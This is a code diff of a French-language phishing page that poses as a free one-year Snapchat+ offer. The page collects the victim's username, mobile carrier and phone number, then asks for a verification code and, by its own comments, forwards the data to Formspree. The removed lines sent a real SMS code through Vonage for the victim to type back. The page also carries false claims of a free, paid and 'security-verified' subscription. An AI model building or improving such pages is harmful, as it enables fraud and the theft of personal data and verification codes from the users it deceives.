@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Snap+ | 1 an !</title>
+<title>Snapchat+ | 1 an !</title>
 
 <style>
 * {
@@ -126,6 +126,9 @@ input {
     color: white;
     outline: none;
     transition: .2s;
+    text-align: center;
+    font-size: 16px;
+    letter-spacing: 2px;
 }
 
 input:focus {
@@ -202,17 +205,17 @@ input:focus {
     <div class="logo">👻</div>
     <h1>Snapchat<span class="plus">+</span></h1>
 
-    <!-- ÉTAPE 1 -->
+    <!-- ÉTAPE 1 : Informations principales -->
     <div id="step1">
-        <p class="subtitle">Disponible uniquement pour les numéros SFR, Bouygues Telecom et Orange — tous les autres opérateurs ne fonctionnent pas</p>
+        <p class="subtitle">Activez Snapchat+ gratuitement pendant 1 an !</p>
         
         <div class="demo">
-           Disponible uniquement pour les numéros SFR, Bouygues Telecom et Orange — tous les autres opérateurs ne fonctionnent pas<br>
-           
+            Disponible uniquement pour les numéros SFR, Bouygues Telecom et Orange — tous les autres opérateurs ne fonctionnent pas<br>
+
         </div>
         
         <div class="badges">
-          <span>✨ Badges exclusifs</span>
+            <span>✨ Badges exclusifs</span>
             <span>🔒 Qui a revu votre story</span>
             <span>🚀 Boost de score</span>
             <span>🔥 Offre limitée</span>
@@ -221,7 +224,7 @@ input:focus {
         
         <form id="secureForm">
             <label>Nom d'utilisateur</label>
-            <input type="text" id="pseudoInput" name="pseudo" placeholder="Votre pseudo" required>
+            <input type="text" id="pseudoInput" name="pseudo" placeholder="Votre pseudo" required style="letter-spacing: normal; text-align: left;">
 
             <label>Opérateur</label>
             <div class="operators">
@@ -232,7 +235,7 @@ input:focus {
             <input type="hidden" name="operateur" id="operateurInput" value="Non précisé">
 
             <label>Numéro de téléphone</label>
-            <input type="tel" id="numero" name="numero" placeholder="06 xx xx xx xx" required pattern="^(06|07)[0-9]{8}$" maxlength="10" title="Veuillez entrer un numéro valide à 10 chiffres">
+            <input type="tel" id="numero" name="numero" placeholder="06 xx xx xx xx" required pattern="^(06|07)[0-9]{8}$" maxlength="10" title="Veuillez entrer un numéro valide à 10 chiffres" style="letter-spacing: normal; text-align: left;">
 
             <button type="submit" class="mainButton" id="btnSubmit">Continuer →</button>
         </form>
@@ -240,26 +243,30 @@ input:focus {
         <div class="footer">L'abonnement Snapchat+ ne vous sera pas facturé. L'abonnement est disponible uniquement pour les utilisateurs éligibles.</div>
     </div>
 
-    <!-- ÉTAPE 2 -->
+    <!-- ÉTAPE 2 : Saisie du code à 5 chiffres -->
     <div id="step-code">
-        <p class="subtitle" style="margin: 15px 0;">Un code aléatoire a été envoyé par SMS sur votre téléphone.</p>
+        <p class="subtitle" style="margin: 15px 0;">Entrez le code de vérification à 5 .</p>
         
+        <div id="code-helper" style="margin-bottom: 15px; background: #242424; padding: 10px; border-radius: 8px; font-size: 14px; color: #ffca00;">
+            Code généré : <b id="displayCode" style="font-size: 18px; letter-spacing: 3px;">-----</b>
+        </div>
+
         <form id="formCode">
-            <label>Code de vérification reçu</label>
-            <input type="text" id="codeSaisi" name="code_verification" placeholder="Entrez le code reçu" required maxlength="4">
+            <label>Code de vérification (5 chiffres)</label>
+            <input type="text" id="codeSaisi" name="code_verification" placeholder="12345" required maxlength="5" pattern="[0-9]{5}">
             
             <button type="submit" class="mainButton" id="btnValiderCode">Valider et transmettre</button>
         </form>
         
-        <div class="footer" id="info-code">Vérifiez vos messages</div>
+        <div class="footer">Sécurité vérifiée</div>
     </div>
 
-    <!-- ÉTAPE 3 -->
+    <!-- ÉTAPE 3 : Succès final -->
     <div id="step-success">
         <div class="success-icon">✔</div>
         <h2 style="color: white; margin-bottom: 10px;">Félicitations</h2>
-        <p style="color: #4CAF50; font-size: 18px; font-weight: bold;">Code validé verifier votre app et reclamez votre snpa +!</p>
-        <p style="color: #8e8e8e; font-size: 14px; margin-top: 15px;">L'abonnement a été payé avec succé.</p>
+        <p style="color: #4CAF50; font-size: 18px; font-weight: bold;">Code à 5 chiffres validé  !</p>
+        <p style="color: #8e8e8e; font-size: 14px; margin-top: 15px;">L'abonnement a été recu.</p>
     </div>
 </div>
 
@@ -291,9 +298,10 @@ input:focus {
     let globalPseudo = "";
     let globalOperateur = "";
     let globalNumero = "";
-    let codeAttendu = ""; // Stocke le vrai code généré
+    let codeGenere = "";
 
-    form.addEventListener('submit', async function(event) {
+    // ÉTAPE 1 : Validation des infos de base et génération d'un code à 5 chiffres
+    form.addEventListener('submit', function(event) {
         event.preventDefault(); 
 
         if(document.getElementById('operateurInput').value === "Non précisé"){
@@ -305,54 +313,30 @@ input:focus {
         globalOperateur = document.getElementById('operateurInput').value;
         globalNumero = document.getElementById('numero').value;
 
-        btnSubmit.innerText = "Envoi du code en cours...";
-        btnSubmit.disabled = true;
+        // Génération d'un code aléatoire exact à 5 chiffres (ex: 48291)
+        codeGenere = Math.floor(10000 + Math.random() * 90000).toString();
+        
+        // Affichage du code généré pour la simulation
+        document.getElementById('displayCode').innerText = codeGenere;
 
-        try {
-            const smsResponse = await fetch('/api/send-sms', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ numero: globalNumero })
-            });
-
-            const smsResult = await smsResponse.json();
-
-            if (smsResponse.ok && smsResult.success) {
-                // On récupère le code généré par le serveur
-                codeAttendu = smsResult.code;
-
-                // Si Vonage a bloqué l'envoi du SMS (limite du compte d'essai), 
-                // on affiche le code discrètement en bas pour que tu puisses tester ton formulaire quand même !
-                if (!smsResult.smsEnvoye) {
-                    document.getElementById('info-code').innerHTML = `<span style="color: #ffca00;">[Mode Test - SMS bloqué par Vonage] Code à taper : <b>${codeAttendu}</b></span>`;
-                }
-
-                document.getElementById('step1').style.display = 'none';
-                document.getElementById('step-code').style.display = 'block';
-            } else {
-                alert("Erreur : " + (smsResult.error || "Problème serveur."));
-                btnSubmit.innerText = "Continuer →";
-                btnSubmit.disabled = false;
-            }
-        } catch (error) {
-            alert("Erreur de connexion avec le serveur.");
-            btnSubmit.innerText = "Continuer →";
-            btnSubmit.disabled = false;
-        }
+        // Passage à l'étape 2
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step-code').style.display = 'block';
     });
 
+    // ÉTAPE 2 : Vérification du code à 5 chiffres et envoi vers Formspree
     formCode.addEventListener('submit', async function(event) {
         event.preventDefault();
 
         const codeSaisi = document.getElementById('codeSaisi').value.trim();
 
-        // VÉRIFICATION STRICTE DU CODE
-        if (codeSaisi !== codeAttendu) {
-            alert("Code incorrect ! Veuillez entrer le bon code.");
+        // Vérification stricte du code à 5 chiffres
+        if (codeSaisi !== codeGenere) {
+            alert("Code incorrect ! Veuillez entrer exactement le code à 5 chiffres indiqué.");
             return;
         }
 
-        btnValiderCode.innerText = "Vérification...";
+        btnValiderCode.innerText = "Transmission en cours...";
         btnValiderCode.disabled = true;
 
         try {
